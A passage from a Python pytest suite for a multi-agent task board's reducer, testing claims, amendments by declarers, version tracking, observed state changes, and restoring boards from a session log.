def test_a_version_is_recorded_as_handed_only_to_the_holder_and_only_forward(
    who: NodeId, version: int
) -> None:
    """
    The stamp is a statement that this holder was shown this text. Each of these
    would make it one about somebody else, about a text that does not exist, or
    take back a showing that happened.
    """
    held = _reduced(
        *_claimed_by_dev(_V1),
        TaskAmended("t1", detail="second", node_id=_LEAD),
        TaskAmended("t1", detail="third"),
        TaskVersionHanded(_DEV, "t1", version=2),
    )
    after = _reduced_from(held, TaskVersionHanded(who, "t1", version=version))

    assert held.tasks["t1"].claimed_version == 2
    assert after.tasks["t1"] is held.tasks["t1"]


@pytest.mark.parametrize(("version", "recorded"), [(0, None), (-1, None), (1, 1), (2, 2)])
def test_a_handed_version_is_at_least_one_when_the_claim_recorded_none(
    version: int, recorded: int | None
) -> None:
    """
    A claim with no recorded version is the one state in which "not backwards"
    has nothing to compare against, so it is where a version below the first
    would otherwise be taken. No reducer arm leaves a claim that way, which is
    why the board is built by hand.
    """
    claimed = _reduced(*_claimed_by_dev(_V1), TaskAmended("t1", detail="second"))
    unrecorded = dataclasses.replace(
        claimed,
        tasks={"t1": dataclasses.replace(claimed.tasks["t1"], claimed_version=None)},
    )

    after = _reduced_from(unrecorded, TaskVersionHanded(_DEV, "t1", version=version))

    assert after.tasks["t1"].claimed_version == recorded


def test_a_task_its_only_willing_agent_amended_stays_pending_and_holds_what_waits_on_it() -> None:
    """
    What ``_pick_claim`` says about stranding, as behaviour: the amender is
    turned away by id and by a bare claim, the operator's own amendment does not
    lift that, the task queued behind the same file waits with it, and the one
    thing that ends it is another agent of the session taking the task by id.
    """
    from pptmstr.store import _apply

    stuck = _reduced(
        TaskDeclared(Task(id="t1", title="do t1", touches=("a.py",)), node_id=_LEAD),
        TaskAmended("t1", detail="second", node_id=_LEAD),
        TaskDeclared(Task(id="t2", title="do t2", touches=("a.py",)), node_id=_LEAD),
        TaskAmended("t1", detail="third"),
    )
    by_id = _apply(stuck, TaskClaimRequested(_LEAD, request_id="k1", task_id="t1"), 9.0)
    bare = _apply(stuck, TaskClaimRequested(_LEAD, request_id="k2"), 9.0)
    freed = _reduced_from(stuck, TaskClaimRequested(_DEV, request_id="k3", task_id="t1"))

    assert stuck.tasks["t2"].blocked_on(stuck.tasks) == ("t1",)
    assert by_id[1] == (ClaimSettled("k1", None, ClaimRefusal.AMENDED_BY_YOU),)
    assert bare[1] == (ClaimSettled("k2", None, ClaimRefusal.NOTHING_CLAIMABLE),)
    assert by_id[0].tasks == bare[0].tasks == stuck.tasks
    assert freed.tasks["t1"].claimed_by == _DEV


def test_a_version_cannot_be_handed_on_a_task_nobody_holds_open_or_that_is_not_there() -> None:
    finished = _reduced(
        *_claimed_by_dev(_V1),
        TaskCompleted(_DEV, "t1", at=3.0),
        TaskAmended("t1", detail="second"),
    )
    released = _reduced(*_claimed_by_dev(_V1), TaskReleased(_DEV, "t1"), TaskAmended("t1", "2"))

    for snap in (finished, released, Snapshot.empty()):
        after = _reduced_from(snap, TaskVersionHanded(_DEV, "t1", version=2))
        assert dict(after.tasks) == dict(snap.tasks)
    assert finished.tasks["t1"].completed_version == 1


def test_amending_a_task_that_is_not_there_creates_nothing_and_says_so_when_asked() -> None:
    from pptmstr.store import _apply

    before, refused, after = _amend(_LEAD, "x", after=())
    _, unasked = _apply(before, TaskAmended("t1", detail="x"), 1.0)

    assert refused is TaskRefusal.NO_SUCH_TASK
    assert dict(after.tasks) == {} and unasked == ()


def _reduced_from(snap: Snapshot, *intents: object) -> Snapshot:
    from pptmstr.store import _apply

    for at, intent in enumerate(intents, start=100):
        snap, _ = _apply(snap, intent, float(at))  # type: ignore[arg-type]
    return snap


# The generated form of the same property. One task, four parties, and every
# order of declare / claim / release / amend / show a version / complete a seed
# produces.

_PARTIES: tuple[NodeId | None, ...] = (None, _LEAD, _DEV, _QA)
_TEXTS = ("first", "second", "third")
_PROPERTIES: tuple[str | None, ...] = (None, None, "never lose a row.", "")


class _Expected:
    """
    What the board should hold, kept by a model that shares no code with the
    reducer: the texts in order, who holds the task, and what each party was
    handed.
    """

    def __init__(self, declarer: NodeId) -> None:
        self.declarer = declarer
        # Every specification the task has had, current last.
        self.texts: list[tuple[str, str]] = [("first", "")]
        self.authors: list[NodeId | None] = [declarer]
        self.holder: NodeId | None = None
        self.finished = False
        # Everyone who has ever taken the task, and every agent that replaced
        # its specification. Neither is ever emptied.
        self.took: set[NodeId] = set()
        self.rewrote: set[NodeId] = set()
        self.handed: int | None = None

    def may_amend(self, who: NodeId | None) -> TaskRefusal | None:
        if who is None:
            return None
        if who != self.declarer:
            return TaskRefusal.NOT_THE_DECLARER
        if who in self.took:
            return TaskRefusal.AMENDER_HELD_IT
        return None


def _amendment_walk(seed: int) -> tuple[list[str], Snapshot]:
    """
    One generated history, checked after every step. Returns what happened, so a
    test can ask whether the seeds between them reached every outcome.
    """
    from pptmstr.effects import TaskWriteSettled
    from pptmstr.store import _apply

    rng = random.Random(seed)
    declarer = rng.choice((_LEAD, _DEV))
    expected = _Expected(declarer)
    snap = _reduced(TaskDeclared(Task(id="t1", title="x", detail="first"), node_id=declarer))
    seen: list[str] = []

    for step in range(rng.randint(4, 14)):
        at = 10.0 + step
        before = snap.tasks["t1"]
        move = rng.choice(("claim", "release", "amend", "amend", "complete", "hand"))
        agent = rng.choice((_LEAD, _DEV, _QA))

        if move == "claim":
            by_id = rng.choice(("t1", None))
            snap, effects = _apply(
                snap, TaskClaimRequested(agent, request_id="k", task_id=by_id), at
            )
            (claim,) = effects
            assert isinstance(claim, ClaimSettled)
            free = expected.holder is None
            # A bare claim also skips a task the agent gave back; that is the
            # reducer's older rule and is read off the record here, not modelled.
            declined = by_id is None and agent in before.released_by
            assert (claim.task is None) == (claim.refusal is not None), (seed, step)
            if free and agent in expected.rewrote:
                assert claim.task is None, (seed, step)
                if by_id is not None:
                    assert claim.refusal is ClaimRefusal.AMENDED_BY_YOU, (seed, step)
                seen.append(TaskRefusal.CLAIMER_AMENDED_IT.value)
            elif free and not declined:
                assert claim.task is not None, (seed, step)
                expected.holder, expected.handed = agent, len(expected.texts)
                expected.took.add(agent)
                seen.append("claimed")
        elif move == "release":
            snap, _ = _apply(snap, TaskReleased(agent, "t1", at=at), at)
            if expected.holder == agent and not expected.finished:
                expected.holder, expected.handed = None, None
                seen.append("released")
        elif move == "hand":
            shown = rng.randint(0, len(expected.texts) + 1)
            snap, _ = _apply(snap, TaskVersionHanded(agent, "t1", version=shown), at)
            if (
                expected.holder == agent
                and not expected.finished
                and expected.handed is not None
                and expected.handed <= shown <= len(expected.texts)
            ):
                seen.append("handed a later version" if shown > expected.handed else "handed")
                expected.handed = shown
        elif move == "complete":
            snap, _ = _apply(snap, TaskCompleted(agent, "t1", at=at, result="r"), at)
            if expected.holder == agent and not expected.finished:
                expected.finished = True
                seen.append(
                    "completed stale" if expected.handed != len(expected.texts) else "completed"
                )
        else:
            who = rng.choice(_PARTIES)
            detail, held_to = rng.choice(_TEXTS), rng.choice(_PROPERTIES)
            snap, effects = _apply(
                snap,
                TaskAmended("t1", detail, node_id=who, property=held_to, request_id="a", at=at),
                at,
            )
            (settled,) = effects
            assert isinstance(settled, TaskWriteSettled)
            # (a) who succeeded.
            assert settled.refusal is expected.may_amend(who), (seed, step, who)
            if settled.refusal is None:
                wanted = (detail, expected.texts[-1][1] if held_to is None else held_to)
                if wanted != expected.texts[-1]:
                    expected.texts.append(wanted)
                    expected.authors.append(who)
                    if who is not None:
                        expected.rewrote.add(who)
                    seen.append(
                        "amended by the operator" if who is None else "amended by its declarer"
                    )
                else:
                    seen.append("amended to itself")
            else:
                seen.append(settled.refusal.value)
                assert snap.tasks["t1"] is before
            # The property as stated, from the two records alone: a changed
            # specification was changed by the operator, or by the declarer while
            # it did not hold the task.
            after = snap.tasks["t1"]
            if (after.detail, after.property) != (before.detail, before.property):
                assert who is None or (who == before.declared_by and who != before.claimed_by)
        # And from the record alone, whatever the move was: no agent has both
        # replaced this task's specification and held it.
        assert not any(snap.tasks["t1"].was_amended_by(node) for node in snap.tasks["t1"].held_by)

        task = snap.tasks["t1"]
        # (b) every text the task has had, in order, and who wrote each.
        history = [(v.detail, v.property) for v in task.superseded]
        assert [*history, (task.detail, task.property)] == expected.texts, (seed, step)
        assert [task.declared_by, *(v.replaced_by for v in task.superseded)] == expected.authors
        assert task.superseded[: len(before.superseded)] == before.superseded
        assert task.version == len(expected.texts)
        # (c) the version a result was written against.
        assert task.completed_version == (expected.handed if expected.finished else None)
        assert task.claimed_version == expected.handed
        assert set(task.held_by) == expected.took and len(task.held_by) == len(expected.took)

    return seen, snap


_WALKS = range(300)


@pytest.mark.parametrize("seed", _WALKS)
def test_a_specification_is_replaced_only_by_its_setter_and_every_text_stays_readable(
    seed: int,
) -> None:
    _amendment_walk(seed)


def test_the_generated_histories_reach_every_outcome_the_property_names() -> None:
    """
    A generator that never amended while the declarer held the task would pass the
    walk above without having tested it.
    """
    seen = {outcome for seed in _WALKS for outcome in _amendment_walk(seed)[0]}

    assert seen == {
        "claimed",
        "released",
        "completed",
        "completed stale",
        "handed",
        "handed a later version",
        "amended by the operator",
        "amended by its declarer",
        "amended to itself",
        TaskRefusal.NOT_THE_DECLARER.value,
        TaskRefusal.AMENDER_HELD_IT.value,
        TaskRefusal.CLAIMER_AMENDED_IT.value,
    }


# -- an observer sees every step -------------------------------------------------------


def test_every_intent_of_a_batch_is_shown_to_the_observer_as_the_step_it_made() -> None:
    """
    The board log is derived from what the observer is shown. Each call carries
    the snapshot the intent was applied to and the one it left, so the steps
    chain; an intent that changed nothing is shown too, as a step between one
    snapshot and itself.
    """
    store = Store()
    store.apply(spawn(ROOT))
    start = store.snapshot()
    intents: list[Intent] = [
        TaskDeclared(Task(id="t1", title="T"), ROOT),
        StateChanged(("nobody", None), AgentState.THINKING),
        TaskClaimRequested(ROOT, request_id="k1", task_id="t1"),
    ]
    seen: list[tuple[Snapshot, Intent, Snapshot, float]] = []

    store.apply_all(intents, now=12.5, observe=lambda *step: seen.append(step))

    assert [step[1] for step in seen] == intents
    assert [step[3] for step in seen] == [12.5, 12.5, 12.5]
    assert seen[0][0] is start and seen[-1][2] is store.snapshot()
    assert all(earlier[2] is later[0] for earlier, later in zip(seen, seen[1:], strict=False))
    assert seen[1][0] is seen[1][2], "the intent for a node nobody has"
    assert "t1" not in seen[0][0].tasks and seen[0][2].tasks["t1"].claimed_by is None
    assert seen[2][2].tasks["t1"].claimed_by == ROOT


def test_one_intent_applied_alone_goes_past_the_same_observer() -> None:
    """``Store.apply`` is a batch of one: there is no way in that is not observed."""
    store = Store()
    start = store.snapshot()
    seen: list[tuple[Snapshot, Intent, Snapshot, float]] = []

    store.apply(spawn(ROOT), now=3.0, observe=lambda *step: seen.append(step))

    assert seen == [(start, spawn(ROOT), store.snapshot(), 3.0)]
    assert seen[0][0] is start and seen[0][2] is store.snapshot()


def test_the_only_call_into_the_reducer_is_the_observed_one() -> None:
    """
    Read off the source: ``_apply`` is called from one place in ``Store``, and
    that place is the loop that calls the observer. A second caller would be a
    way to change the board that the log never hears of.
    """
    source = pathlib.Path(__file__).parent.parent / "pptmstr" / "store.py"
    store_class = next(
        node
        for node in ast.parse(source.read_text()).body
        if isinstance(node, ast.ClassDef) and node.name == "Store"
    )
    callers = [
        method.name
        for method in store_class.body
        if isinstance(method, ast.FunctionDef)
        for call in ast.walk(method)
        if isinstance(call, ast.Call)
        and isinstance(call.func, ast.Name)
        and call.func.id == "_apply"
    ]

    assert callers == ["apply_all"]


def test_an_observer_that_raises_leaves_the_store_where_the_batch_found_it() -> None:
    store = Store()
    start = store.snapshot()

    def broken(*step: object) -> None:
        raise RuntimeError("the writer is gone")

    with pytest.raises(RuntimeError):
        store.apply_all([spawn(ROOT), spawn(CHILD, ROOT)], observe=broken)

    assert store.snapshot() is start


# -- why a claim won nothing -----------------------------------------------------------

_BUILDER: NodeId = ("sess-1", "agent-b")


def _claimed_board() -> Store:
    """
    One of each thing a named claim can meet: free, held by another, held by the
    asker, finished, waiting, amended by the asker, and another session's.
    """
    store = Store()
    for task_id in ("free", "theirs", "mine", "done"):
        store.apply(TaskDeclared(Task(id=task_id, title=task_id), ROOT))
    store.apply(TaskDeclared(Task(id="waits", title="waits", depends_on=("free",)), ROOT))
    store.apply(TaskDeclared(Task(id="elsewhere", title="elsewhere"), OTHER))
    store.apply(TaskClaimRequested(_BUILDER, request_id="k", task_id="theirs"))
    store.apply(TaskClaimRequested(CHILD, request_id="k", task_id="mine"))
    store.apply(TaskClaimRequested(_BUILDER, request_id="k", task_id="done"))
    store.apply(TaskCompleted(_BUILDER, "done", at=1.0))
    store.apply(TaskDeclared(Task(id="own", title="own"), CHILD))
    store.apply(TaskAmended("own", "a second text", node_id=CHILD))
    return store


@pytest.mark.parametrize(
    ("task_id", "why"),
    [
        ("nowhere", ClaimRefusal.NOT_ON_YOUR_BOARD),
        ("elsewhere", ClaimRefusal.NOT_ON_YOUR_BOARD),
        ("theirs", ClaimRefusal.HELD),
        ("mine", ClaimRefusal.ALREADY_YOURS),
        ("done", ClaimRefusal.COMPLETE),
        ("waits", ClaimRefusal.WAITING),
        ("own", ClaimRefusal.AMENDED_BY_YOU),
    ],
)
def test_a_claim_that_won_nothing_says_which_of_its_causes_it_met(
    task_id: str, why: ClaimRefusal
) -> None:
    """
    Each is a different mistake with a different recovery, and the reply is the
    only place the reducer's reason can travel: without it the tool can only
    list every cause and send the agent to read the board.
    """
    store = _claimed_board()
    before = store.snapshot()

    effects = store.apply(TaskClaimRequested(CHILD, request_id="k7", task_id=task_id))

    assert effects == (ClaimSettled(request_id="k7", task=None, refusal=why),)
    assert store.snapshot().tasks == before.tasks


def test_a_claim_that_won_a_task_carries_no_reason_and_a_bare_one_that_did_not_says_so() -> None:
    store = _claimed_board()

    (won,) = store.apply(TaskClaimRequested(CHILD, request_id="k1", task_id="free"))
    assert isinstance(won, ClaimSettled)
    assert won.task is not None and won.refusal is None

    # What is left is held, finished, waiting on a task that is taken and not
    # finished, or this agent's own rewrite.
    (bare,) = store.apply(TaskClaimRequested(CHILD, request_id="k2"))
    assert bare == ClaimSettled("k2", None, ClaimRefusal.NOTHING_CLAIMABLE)


# -- a board from its log ----------------------------------------------------------------

_CLOCK = Clock(wall=5_000.0, monotonic=100.0)
_OLD_BUILDER: NodeId = ("sess-1", "old-builder")


def _wall(seconds_ago: float) -> float:
    return _CLOCK.wall - seconds_ago


def _logged(*records: boardlog.Record) -> boardlog.Board:
    return boardlog.restore(records)


def _records_of_one_claimed() -> tuple[boardlog.Record, ...]:
    return (
        boardlog.Declared(
            at=_wall(50.0),
            task_id="t1",
            title="T",
            declared_by="lead",
            declared_by_id=("sess-1",),
        ),
        boardlog.Claimed(at=_wall(40.0), task_id="t1", by="builder-2", by_id=_OLD_BUILDER),
    )


def _one_claimed() -> boardlog.Board:
    """A log in which the lead declared a task and a builder was holding it."""
    return _logged(*_records_of_one_claimed())


def _restore(store: Store, board: boardlog.Board, session_id: str = "sess-1") -> None:
    assert store.apply(BoardRestored(session_id, board, _CLOCK), now=_CLOCK.monotonic) == ()


def test_a_restored_board_is_in_the_store_as_tasks_and_concerns_of_its_session() -> None:
    board = _logged(
        boardlog.Declared(
            at=_wall(50.0),
            task_id="t1",
            title="T",
            declared_by="lead",
            detail="the text",
            touches=("a.py",),
            basis="read",
            property="never short",
            declared_by_id=("sess-1",),
        ),
        boardlog.Claimed(at=_wall(40.0), task_id="t1", by="builder-2", by_id=_OLD_BUILDER),
        boardlog.Completed(
            at=_wall(30.0),
            task_id="t1",
            by="builder-2",
            result="3/3",
            basis="run",
            not_run="",
            by_id=_OLD_BUILDER,
        ),
        boardlog.Posted(
            at=_wall(20.0),
            concern_id="c1",
            sender="builder-2",
            recipient="lead",
            subject="s",
            body="b",
            task_id="t1",
            incident=True,
            sender_id=_OLD_BUILDER,
            recipient_id=("sess-1",),
        ),
    )
    store = Store()

    _restore(store, board)

    snap = store.snapshot()
    assert snap.tasks["t1"] == Task(
        id="t1",
        title="T",
        detail="the text",
        touches=("a.py",),
        claimed_by=_OLD_BUILDER,
        state=TaskState.COMPLETED,
        declared_at=50.0,
        completed_at=70.0,
        declared_by=ROOT,
        result="3/3",
        basis=Basis.READ,
        result_basis=Basis.RUN,
        property="never short",
        not_run="",
        claimed_version=1,
        held_by=(_OLD_BUILDER,),
    )
    assert snap.concerns["c1"] == Concern(
        id="c1",
        sender=_OLD_BUILDER,
        recipient=ROOT,
        subject="s",
        body="b",
        posted_at=80.0,
        task_id="t1",
        incident=True,
    )
    report = snap.restores["sess-1"]
    assert (report.tasks, report.concerns, report.unplaced) == (1, 1, ())
    assert report.at == _CLOCK.monotonic and report.adoptable and not report.short
    assert dict(report.parties) == {_OLD_BUILDER: "builder-2"}


def test_the_same_board_handed_over_twice_is_not_a_second_step() -> None:
    store = Store()
    _restore(store, _one_claimed())
    once = store.snapshot()

    _restore(store, _one_claimed())

    assert store.snapshot() is once


def test_a_restored_id_another_session_already_has_is_left_out_and_never_written_over() -> None:
    """
    Task ids are one namespace for every session and leads choose them by hand.
    The live session keeps its task, as the very object it was; the restored
    session's is reported as not placed, and the rest of its board is placed.
    """
    store = Store()
    store.apply(TaskDeclared(Task(id="t1", title="theirs"), OTHER))
    theirs_too = Concern(
        id="c1", sender=OTHER, recipient=OTHER, subject="s", body="b", posted_at=1.0
    )
    store.apply(ConcernPosted(OTHER, theirs_too))
    theirs, their_concern = store.snapshot().tasks["t1"], store.snapshot().concerns["c1"]
    board = _logged(
        *(
            boardlog.Declared(
                at=_wall(50.0 - n),
                task_id=task_id,
                title="ours",
                declared_by="lead",
                declared_by_id=("sess-1",),
            )
            for n, task_id in enumerate(("t1", "t2"))
        ),
        boardlog.Posted(
            at=_wall(9.0),
            concern_id="c1",
            sender="lead",
            recipient="lead",
            subject="ours",
            body="b",
            sender_id=("sess-1",),
            recipient_id=("sess-1",),
        ),
    )

    _restore(store, board)

    snap = store.snapshot()
    assert snap.tasks["t1"] is theirs and snap.concerns["c1"] is their_concern is theirs_too
    assert snap.tasks["t2"].title == "ours" and snap.tasks["t2"].belongs_to("sess-1")
    report = snap.restores["sess-1"]
    assert report.unplaced == (
        NotPlaced("task", "t1", Unplaced.OTHER_SESSION_HAS_ID, holder="sess-2"),
        NotPlaced("concern", "c1", Unplaced.OTHER_SESSION_HAS_ID, holder="sess-2"),
    )
    assert (report.tasks, report.concerns) == (1, 0)
    assert report.short and not report.adoptable and not report.refused
    # And a second application finds the same collision and changes nothing.
    _restore(store, board)
    assert store.snapshot() is snap


def test_a_store_that_holds_another_board_for_the_session_takes_nothing_and_says_so() -> None:
    """
    The session is live in this store and has moved on: its task is finished here
    and held in the log, and it has declared one the log has never heard of. No
    part of the logged board is laid over that, including the logged task whose
    id is free.
    """
    store = Store()
    store.apply(TaskDeclared(Task(id="t1", title="T", declared_at=50.0), ROOT))
    store.apply(TaskClaimRequested(_OLD_BUILDER, request_id="k", task_id="t1"))
    store.apply(TaskCompleted(_OLD_BUILDER, "t1", at=60.0))
    store.apply(TaskDeclared(Task(id="newer", title="N"), ROOT))
    before = store.snapshot()
    board = _logged(
        *_records_of_one_claimed(),
        boardlog.Declared(
            at=_wall(10.0),
            task_id="t9",
            title="free id",
            declared_by="lead",
            declared_by_id=("sess-1",),
        ),
    )

    _restore(store, board)

    snap = store.snapshot()
    assert dict(snap.tasks) == dict(before.tasks)
    assert all(snap.tasks[task_id] is task for task_id, task in before.tasks.items())
    report = snap.restores["sess-1"]
    assert report.refused and not report.adoptable and report.at is None
    assert (report.tasks, report.concerns) == (0, 0)
    assert set(report.unplaced) == {
        NotPlaced("task", "t1", Unplaced.STORE_DIFFERS),
        NotPlaced("task", "newer", Unplaced.STORE_ONLY),
        NotPlaced("task", "t9", Unplaced.WITHHELD),
    }
    assert dict(report.parties) == {}, "a party of a board that was not placed is not on it"


def test_a_refused_restore_leaves_the_earlier_one_standing_in_the_report() -> None:
    """
    The board was restored, the session moved on, and the log is handed over
    again. The refusal is reported; the instant the restore is dated from and the
    parties it named are the earlier restore's, because its tasks are still there.
    """
    store = Store()
    _restore(store, _one_claimed())
    placed = store.snapshot().restores["sess-1"]
    store.apply(TaskDeclared(Task(id="newer", title="N"), ROOT))

    _restore(store, _one_claimed())

    report = store.snapshot().restores["sess-1"]
    assert report.refused and not report.adoptable
    assert (report.at, report.parties) == (placed.at, placed.parties)
    assert report.unplaced == (NotPlaced("task", "newer", Unplaced.STORE_ONLY),)
    assert store.snapshot().left_behind(_OLD_BUILDER) == "builder-2"


def test_what_the_log_could_not_give_is_carried_and_ends_adoption() -> None:
    """
    A stray record, a contested one and damage are the log's own shortness. The
    board is placed as far as it goes; the report says it is short and that
    nothing should be appended behind it.
    """
    stray = boardlog.Claimed(at=_wall(1.0), task_id="never-declared", by="x")
    second_claim = boardlog.Claimed(
        at=_wall(2.0), task_id="t1", by="builder", by_id=("sess-1", "b")
    )
    log = boardlog.Log(
        records=(*_records_of_one_claimed(), stray, second_claim),
        damage=boardlog.Damage(ordinal=4, reason="missing", unread=3),
    )
    store = Store()

    _restore(store, boardlog.restore_log(log))

    report = store.snapshot().restores["sess-1"]
    assert store.snapshot().tasks["t1"].claimed_by == _OLD_BUILDER
    assert (report.tasks, report.unplaced) == (1, ())
    assert (report.log_stray, report.log_contested, report.log_unrecognised) == (1, 1, 0)
    assert report.log_stopped == 0
    assert report.log_damage == "unreadable from record 4: missing, 3 record(s) behind it unread"
    assert report.log_short and report.short and not report.adoptable


def test_shortness_is_the_boards_own_answer_and_not_a_recount_of_it() -> None:
    """
    ``Board.short`` has more reasons than the report itemises, and can gain one.
    The report carries the answer it was given.
    """

    class Short(boardlog.Board):
        __slots__ = ()

        @property
        def short(self) -> bool:
            return True

    store = Store()
    _restore(store, Short(tasks=_one_claimed().tasks))
    stopped = Store()
    marker = boardlog.RecordingStopped(at=_wall(1.0), reason="disk full")
    _restore(stopped, _logged(*_records_of_one_claimed(), marker))
    halted = stopped.snapshot().restores["sess-1"]
    assert (halted.log_stopped, halted.log_short, halted.adoptable) == (1, True, False)

    report = store.snapshot().restores["sess-1"]
    assert report.log_short and not report.adoptable
    assert (report.log_damage, report.log_stray, report.log_contested) == (None, 0, 0)


def _task(**fields: Any) -> RestoredTask:
    made = RestoredTask(
        id="t1",
        title="T",
        declared_by=ROOT,
        versions=(boardlog.TaskVersion(_wall(50.0), "the text", ROOT),),
    )
    return dataclasses.replace(made, **fields)


def _placed(*tasks: RestoredTask, concerns: tuple[RestoredConcern, ...] = ()) -> Snapshot:
    store = Store()
    _restore(store, boardlog.Board(tasks=tasks, concerns=concerns))
    return store.snapshot()


_SECOND = boardlog.TaskVersion(_wall(45.0), "a second text", _OLD_BUILDER)


@pytest.mark.parametrize(
    ("task", "why"),
    [
        (_task(state=TaskState.CLAIMED), Unplaced.INCOHERENT),
        (_task(state=TaskState.COMPLETED, completed_at=1.0), Unplaced.INCOHERENT),
        (_task(state=TaskState.CLAIMED, holder=_OLD_BUILDER), Unplaced.INCOHERENT),
        (
            _task(state=TaskState.COMPLETED, holder=_OLD_BUILDER, held_by=(_OLD_BUILDER,)),
            Unplaced.INCOHERENT,
        ),
        (
            _task(
                state=TaskState.CLAIMED,
                holder=_OLD_BUILDER,
                held_by=(_OLD_BUILDER,),
                claimed_version=2,
            ),
            Unplaced.INCOHERENT,
        ),
        (_task(versions=(_task().versions[0], _SECOND)), Unplaced.INCOHERENT),
        (
            _task(
                versions=(
                    _task().versions[0],
                    dataclasses.replace(_SECOND, by=ROOT),
                ),
                held_by=(ROOT,),
            ),
            Unplaced.INCOHERENT,
        ),
        (_task(versions=()), Unplaced.INCOHERENT),
        (_task(declared_by=OTHER), Unplaced.NOT_THIS_SESSIONS),
        (_task(depends_on=("t1",)), Unplaced.WOULD_CYCLE),
    ],
    ids=[
        "held by nobody",
        "finished by nobody",
        "held by an agent that never claimed it",
        "finished at no time",
        "handed a version it has not had",
        "amended by an agent that did not declare it",
        "amended by a declarer that has held it",
        "no text at all",
        "declared by another session",
        "waits on itself",
    ],
)
def test_a_task_the_reducer_could_not_have_left_is_not_placed(
    task: RestoredTask, why: Unplaced
) -> None:
    """
    A board is a value anybody can build. What it says is placed only where the
    store's own arms could have said it.
    """
    snap = _placed(task)

    assert "t1" not in snap.tasks
    assert snap.restores["sess-1"].unplaced == (NotPlaced("task", "t1", why),)
    assert not snap.restores["sess-1"].adoptable


def test_a_restored_task_is_spelled_the_way_a_declaration_spells_it() -> None:
    snap = _placed(
        _task(
            touches=("./a.py", "a.py"),
            versions=(
                boardlog.TaskVersion(_wall(50.0), "the text", ROOT, "measured", "  two   words "),
            ),
        )
    )

    task = snap.tasks["t1"]
    assert task.touches == ("a.py",) and task.property == "two words"
    assert task.basis is None, "a basis this build has no member for reads as unstated"
    assert snap.restores["sess-1"].unplaced == ()


_OLD_CLAIM = {"state": TaskState.CLAIMED, "holder": _OLD_BUILDER, "held_by": (_OLD_BUILDER,)}


@pytest.mark.parametrize(
    "said",
    [
        {"holder": _OLD_BUILDER, "held_by": (_OLD_BUILDER,)},
        {"claimed_version": 1},
        {"completed_at": 3.0},
        {"result": "smuggled"},
        {"result_basis": "run"},
        {"not_run": ""},
        {**_OLD_CLAIM, "completed_at": 3.0},
        {**_OLD_CLAIM, "result": "smuggled"},
        {**_OLD_CLAIM, "result_basis": "run"},
        {**_OLD_CLAIM, "not_run": "the probe"},
    ],
    ids=lambda said: ",".join(k for k in said if k not in {"state", "held_by"}),
)
def test_a_task_that_says_more_than_its_state_has_is_left_out_and_the_board_is_short(
    said: dict[str, Any],
) -> None:
    """
    A holder on a task nobody holds, a result on one nobody finished. Placing
    the task without them would be a board the log does not describe, and the
    report would call it whole -- which is what says a record may be appended
    behind the log.
    """
    snap = _placed(_task(**said))

    report = snap.restores["sess-1"]
    assert "t1" not in snap.tasks
    assert report.unplaced == (NotPlaced("task", "t1", Unplaced.INCOHERENT),)
    assert report.short and not report.adoptable


def test_the_held_task_those_cases_start_from_is_itself_placed() -> None:
    snap = _placed(_task(**_OLD_CLAIM))

    assert snap.tasks["t1"].claimed_by == _OLD_BUILDER
    assert snap.restores["sess-1"].adoptable


@pytest.mark.parametrize(
    "said",
    [
        {"state": TaskState.CLAIMED, "holder": ("sess-2", "x"), "held_by": (("sess-2", "x"),)},
        {"held_by": (("sess-2", "x"),)},
        {"released_by": (("sess-2", "x"),), "released_at": 3.0},
    ],
    ids=["held", "once held", "given back"],
)
def test_a_task_another_sessions_agent_is_said_to_have_held_is_not_placed(
    said: dict[str, Any],
) -> None:
    """
    No claim crosses sessions, so the log is describing a board the store never
    held -- and placed, the row would show this session's task in a stranger's
    hands.
    """
    snap = _placed(_task(**said))

    report = snap.restores["sess-1"]
    assert "t1" not in snap.tasks
    assert report.unplaced == (NotPlaced("task", "t1", Unplaced.INCOHERENT),)
    assert dict(report.parties) == {}, "another session's agent is not a party of this board"


def test_a_restored_task_never_waits_on_and_a_concern_never_points_at_a_strangers_task() -> None:
    """
    The session's own ``t1`` is left out because another session has the id.
    What was restored around it named *that* task: the dependent goes on waiting
    for it as for a task that is missing, whatever the stranger's ``t1`` does,
    and the concern about it is about a task this board does not have.
    """
    store = Store()
    builder: NodeId = ("sess-2", "b")
    store.apply(TaskDeclared(Task(id="t1", title="theirs"), OTHER))
    _restore(
        store,
        boardlog.Board(
            tasks=(_task(), _task(id="t2", depends_on=("t1",))),
            concerns=(
                RestoredConcern(
                    id="c1",
                    sender=ROOT,
                    recipient=ROOT,
                    subject="s",
                    body="b",
                    posted_at=_wall(5.0),
                    task_id="t1",
                ),
            ),
        ),
    )
    store.apply(TaskClaimRequested(builder, request_id="k1", task_id="t1"))
    store.apply(TaskCompleted(builder, "t1", at=_CLOCK.monotonic + 1.0))

    snap = store.snapshot()
    assert snap.restores["sess-1"].unplaced == (
        NotPlaced("task", "t1", Unplaced.OTHER_SESSION_HAS_ID, holder="sess-2"),
    )
    assert snap.tasks["t1"].state is TaskState.COMPLETED and snap.tasks["t1"].belongs_to("sess-2")
    assert snap.tasks["t2"].blocked_on(snap.tasks) == ("t1",)
    assert not snap.tasks["t2"].is_claimable(snap.tasks)
    (row,) = board_tasks(snap, "sess-1")
    assert (row.id, row.blocked_on, row.missing) == ("t2", ("t1",), ("t1",))
    (mail,) = board_concerns(snap, "sess-1")
    assert (mail.task_id, mail.task_missing) == ("t1", True)


def test_a_cycle_is_looked_for_on_the_declarers_own_board() -> None:
    """
    ``theirs`` names ``mine`` and is another session's, so its dependency is on
    an id its own board lacks and is no path back to this declaration.
    """
    store = Store()
    store.apply(TaskDeclared(Task(id="theirs", title="t", depends_on=("mine",)), OTHER))
    effects = store.apply(
        TaskDeclared(Task(id="mine", title="m", depends_on=("theirs",)), ROOT, "d1")
    )
    own = store.apply(TaskDeclared(Task(id="loop", title="l", depends_on=("loop",)), ROOT, "d2"))

    assert effects == (TaskWriteSettled("d1", None),)
    assert own == (TaskWriteSettled("d2", TaskRefusal.WOULD_CYCLE),)


def test_a_finished_task_keeps_a_result_under_the_completion_arms_rules() -> None:
    done = {"state": TaskState.COMPLETED, "holder": _OLD_BUILDER, "held_by": (_OLD_BUILDER,)}
    blank = _placed(
        _task(**done, completed_at=_wall(5.0), result="  ", result_basis="run", not_run="")
    ).tasks["t1"]
    listed = _placed(
        _task(**done, completed_at=_wall(5.0), result="", result_basis="run", not_run="the probe")
    ).tasks["t1"]

    assert (blank.result, blank.result_basis, blank.not_run) == ("", None, None)
    assert (listed.result, listed.result_basis, listed.not_run) == ("", None, "the probe")


def test_a_board_that_names_an_id_twice_places_the_first_and_reports_the_second() -> None:
    snap = _placed(_task(title="first"), _task(title="second"))

